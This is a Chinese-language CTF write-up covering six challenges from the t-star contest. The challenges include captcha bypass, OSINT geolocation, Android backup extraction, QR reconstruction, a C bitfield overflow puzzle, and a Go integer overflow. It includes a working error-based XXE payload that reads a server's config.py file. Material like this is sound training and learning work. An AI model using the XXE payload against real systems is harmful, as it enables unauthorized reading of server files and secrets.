# t-star writeup

## 赛题一

一个简单的验证码绕过,在包里,抓一下就可以登陆进后台了

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled.png)

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%201.png)

在进入后台后,找到了几个功能点,尝试了sql注入等,一直没成功.

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%202.png)

[https://www.mi1k7ea.com/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/](https://www.mi1k7ea.com/2019/06/27/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9C%8B%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0XXE%E6%94%BB%E5%87%BB/)

后面应该要用XXE漏洞,这里自己知识方面有欠缺,确实没想到这个点

不过在看到有的师傅说用XXE的时候,自己尝试了也没成功,当时是报错了,没有解决...

看wp的时候发现有的师傅通过报错找到了解决方案

参考:[https://j7ur8.github.io/WebBook/VUL/%E6%8A%A5%E9%94%99XXE.html](https://j7ur8.github.io/WebBook/VUL/%25E6%258A%25A5%25E9%2594%2599XXE.html)

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%203.png)

Content-Type: application/xml;charset=UTF-8

[http://175.178.148.197:5000/#/login](http://175.178.148.197:5000/#/login)

```php
<!DOCTYPE message [

    <!ENTITY % aaa '

        <!ENTITY &#x25; file SYSTEM "file:///proc/self/cwd/config.py">

        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaa&#x25;file;&#x27;>">

        &#x25;eval;

        &#x25;error;

    '>

    %aaa;

]>
```

## 赛题二

当时在直播间网站里找到了返回主播信息的api,但是那个不对,是chengdu

瞎猜了一个腾讯总部,shenzhen...

看了wp后发现...没那么简单

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%204.png)

通过直播间id 及提示微博,找到这个用户

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%205.png)

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%206.png)

这两张图片....

为啥要放两张呢,肯定有猫腻,两张图应该会不一样(找不同)

所以需要用到图片对比工具

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%207.png)

能发现有一处不同...

结合上面的N,猜想这个像素点代表了经纬度...

所以怎么查找像素点位置呢

可以用工具,也可以用python脚本

参考 [https://blog.csdn.net/People1007/article/details/122420735](https://blog.csdn.net/People1007/article/details/122420735)

```python
# -*- coding: utf-8 -*-
"""
Created on Mon Jan 10 13:58:57 2022
@author: 2540817538（有问题联系此QQ）
"""
import cv2
img=cv2.imread('C:/Users/25408/Desktop/p1.jpg')
 
def on_EVENT_LBUTTONDOWN(event, x, y, flags, param):
    if event == cv2.EVENT_LBUTTONDOWN:
        xy = "%d,%d" % (x, y)
        print(x,y)
        cv2.circle(img, (x, y), 2, (0, 0, 255))
        cv2.putText(img, xy, (x, y), cv2.FONT_HERSHEY_PLAIN,1.0, (0,0,255))
        cv2.imshow("image", img)
        
cv2.namedWindow("image")
cv2.setMouseCallback("image", on_EVENT_LBUTTONDOWN)
while(1):
    cv2.imshow("image", img)
    key = cv2.waitKey(5) & 0xFF
    if key == ord('q'):
        break
cv2.destroyAllWindows()
```

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%208.png)

官方推荐的工具:[https://www.textcompare.org/image/](https://www.textcompare.org/image/)

东经114, 纬度的话,159不太合适,应该是180-159 ,大概是21

就大概在深圳附近了

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%209.png)

## 赛题三

首先分析数据包,找到一个东西,搜索一下后发现是安卓的备份文件,

然后就找工具进行提取

解密工具https://github.com/nelenkov/android-backup-extractor

**注意在流量包导出的时候要用raw格式,不然会出错**

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2010.png)

[https://www.pythonheidong.com/blog/article/292582/15f3839803f9ac5b7aa5/](https://www.pythonheidong.com/blog/article/292582/15f3839803f9ac5b7aa5/)

怀疑是加密的备份文件

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2011.png)

[https://blog.csdn.net/qq_33356474/article/details/92188491/](https://blog.csdn.net/qq_33356474/article/details/92188491/)

[https://blog.csdn.net/rozol/article/details/89262879](https://blog.csdn.net/rozol/article/details/89262879)

反编译apk

[https://blog.csdn.net/qq_28018283/article/details/115330062](https://blog.csdn.net/qq_28018283/article/details/115330062)

提取备份文件的时候有密码,密码也在流量里,

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2012.png)

**这里有一个问题,mac系统提取的文件可能有问题,我少了一个压缩包,回头再研究**

解压缩后得到了一个flag.zip和密钥文件

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2013.png)

这是一个加密文件和私钥,用私钥解开即可

```python
from M2Crypto import RSA,BIO

private_key_str = file('private_key.pem','rb').read();
private_key = RSA.load_key_string(private_key_str);
with open("key.en",r) as f:
    data = f.read()
de_data = private_key.private_decrypt(data,RSA.pkcs1_padding);
```

或者

openssl rsautl -decrypt -in key.en -inkey private_key.pem -out [flag.de](http://flag.de/)

得到密码后解开压缩包,里面的flag.txt是一串01

```python
1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111
```

在网上搜索了一番,猜想可能是代表二维码,01代表黑白像素,用脚本解一下

```python
from PIL import Image
MAX = 29
#二维码大小
pic = Image.new("RGB",(MAX, MAX))
str = "1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111"
# str为获取的01片段,注意要把01连成一串，因为换行符也是占一位的，会干扰图像
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("1.png")
```

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2014.png)

扫描后得到/033yia8rqea1921ca61/systemlockdown

再加上apk里面有个ip,这样的话组合起来下载这个文件

下载下来之后发现是一个二进制文件和一个readme,阅读后知道是一个门禁系统,给了源码,需要你去破解密码.

下面的事情就是阅读源码找出漏洞了,给了源码,就可以自己编译调试了,最笨的办法就是加一些输出来调试变量.

读了一段时间后,明白了这个逻辑, 你只能输入数字,并且必须输入一样的,它会有三个检查的地方,

checker1->passed && (checker1->checksum1 == checker1->checksum2) && checker1->checksum3 > 0)

分别检查passed是否为0,checksum1是否等于checksum2,checker1是否大于checksum3.

其实如果为了快速解题的话,答案已经快出来了,既然只能输入一样的数字,那就10种选择了,虽然题目说了是6位密码,但实际上它检查了7位,所以可以输入7位.挨个尝试后得到答案.

正统的解应该是第七位是一个溢出,覆盖到了结构体里面的key_data,而key_data是由比特表示各个字段的,所以,字符5的二进制表示00110101,存放进去后passed = 1 / checksum = 01 / checksum2 = 01 / checksum3 = 001,可以满足上述条件.

```c
struct { 
		char password[6];
		char key_data;
	} management = { 0 };

```

```c
门禁用的是Windows 10，x86系统……经过一番分析，你成功拿到了门禁系统源码，可喜的是，门禁认证系统已经写死，即使是管理员也无法更新。
但，就在破解源码的过程中，管理员也觉察到门禁源码泄露，提前关闭了门禁系统，你输入的密码将无法认证。
时间一分一秒过去，不能再犹豫了，需要立即输入密码，解锁门禁。

PS: MSVC 2015以后的版本编译，Debug，不开启任何优化，请以提供的附加材料为准（Binary与下列源码表现一致，输入的答案通过与否请以该Binary的输出为准）。
flag：如果你认为输入12345可以解锁门禁，则请提交答案：md5(12345)

#include <iostream>

struct door_key {
	unsigned char passed : 1;
	unsigned char checksum1 : 2;
	unsigned char checksum2 : 2;
	unsigned char checksum3 : 3; 
};

//The system doesn't allow ANYBODY to log in now.
#define SYSTEM_SHUTDOWN 1

void check(char* password, door_key* d) {
	if (SYSTEM_SHUTDOWN) {
		return;
	}

	if (memcmp(password, "888888", 6) == 0) {
		d->passed = 1;
		d->checksum1 = 88;
		d->checksum2 = 88;
		d->checksum3 = 88;
	}
}

void call_the_police() {
	abort();
}

int main()
{
	door_key* checker1 = 0; 

	struct { 
		char password[6];
		char key_data;
	} management = { 0 };

	char ch = 0;
	char last_ch = 0;
	int i = 0;
	
	if (SYSTEM_SHUTDOWN) {
		std::cout << "Notify from the administrator: NOBODY is allowed to login now!!!" << std::endl;
		std::cout << "YOUR LOGIN REQUEST WILL NOT BE HANDLED AND WE WILL CALL THE POLICE INSTANTNLY IF YOU DIDN'T PASS THE CHECK." << std::endl;
	}
retry:
	std::cout << "Please enter your 6-digit password, type '[6 digit number] then Enter' to confirm (For example: 123456): " << std::endl;
	for (i = 0; i <= 6; i++) {
		ch = std::cin.get();

		if (ch == '\n')
			break;
		if (!isdigit(ch) && ch != '\n')
			call_the_police();

		// Developer A:
		//  Add an easy check, our strong 6-digit password is 888888 ! 
		//  Pre-check if every digit is the same. 
		if (ch != '\n' && last_ch && ch != last_ch) 
			call_the_police();
		
		last_ch = ch;
		management.password[i] = ch;
	}; 

	checker1 = (door_key *)&(management.key_data); 

	check(management.password, checker1);

	if ((checker1->passed && (checker1->checksum1 == checker1->checksum2) && checker1->checksum3 > 0)) {
		std::cout << "Congurations! You have entered the correct password.";
	}
	else
		call_the_police();
}
```

Flag：md5(5555555) = 992e63080ee1e47b99f42b8d64ede953

## 赛题4



![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2015.png)

二维码修复比较白给,少了左上角,用画图补上就行

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2016.png)

或者直接strings也能查到信息

扫出来是一个地址,下载下来一个加密压缩包

我真是一个压缩包.对压缩包进行修复,开头错了,改成504B0304即可

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2017.png)

然后解压压缩包,得到一段音频,放到Audacity里面看看

很明显的莫斯密码,

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2018.png)

[https://www.notion.so](https://www.notion.so)

```php
.----/----./----./.----/-----/...--/---../-..../--.../----./--...
```

解密出密码

19910386797

解密压缩包得到flag

[https://darknet.hacker5t2ohub.com/](https://darknet.hacker5t2ohub.com/)

## 赛题五



![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2019.png)

上面给的是一个网站,进入后发现背景是暗网,提示你要有足够的钱,那么猜测要有什么支付漏洞,来增加你的余额,常规的方法都试了,,不太行.

比赛结束后看了下wp发现是溢出....

在比赛的时候应该先测试一下购买数量的... 购买数量有限制 0 < x < 35

同时go的int对应范围

int8 : -128 to 127
int16 : -32768 to 32767

所以买最贵的那个可以造成溢出,

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2020.png)

得到邮箱和密码

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2021.png)

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2022.png)

在邮件中找到了三份加密的hash,需要进行破解,这里wp偷个懒,,后面再复现..

听说可以直接cmd5网站解...

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2023.png)

或者...根据提示,能定位到是米特尼克的书,欺骗的艺术里的一段话....

整段话就是密码

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2024.png)

## 赛题六



![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2025.png)

得到的文件file一下,看到是docx文件,改一下后缀打开,

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2026.png)

这里还有隐藏文字..不过在mac里用文本编辑可以直接查看到里,win下txt或许也行?

（全选文字，右键-》字体-》隐藏）

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2027.png)

得到Flag2（772e91/webs）和一张图片,

图片尝试了一些隐写..没找到东西

这个就属于知识面不足了...烂大街的隐写已经不行了,已经是签到水平了,需要了解图片背后的算法以及形成的原理等,从这里找方向突破

guess隐写,

[https://blog.csdn.net/qq_42939527/article/details/105200093](https://blog.csdn.net/qq_42939527/article/details/105200093)

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2028.png)

第三个点...是在书签里... 选择文字，插入书签，

害,那是不是什么页眉页脚,什么宏都可以插入

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2029.png)

![Untitled](t-star%20writeup%20ba9b7e3edc97424d9aff84bdfbd1c76e/Untitled%2030.png)

拼接线索 175.178.148.197/062ycz7s9458b772e91/webs

最后的web是一个ssrf,没有做到那里..

## 参考

[https://cloud.tencent.com/developer/article/1986640](https://cloud.tencent.com/developer/article/1986640)

[https://blog.yoshino-s.online/2022/04/23/tstar-wp/](https://blog.yoshino-s.online/2022/04/23/tstar-wp/)

不同文件的开头hex

[https://blog.csdn.net/weixin_39699670/article/details/111801139](https://blog.csdn.net/weixin_39699670/article/details/111801139)

outguess 隐写

[https://blog.csdn.net/weixin_43877387/article/details/103123858](https://blog.csdn.net/weixin_43877387/article/details/103123858)

[https://www.bilibili.com/read/cv6112705/](https://www.bilibili.com/read/cv6112705/)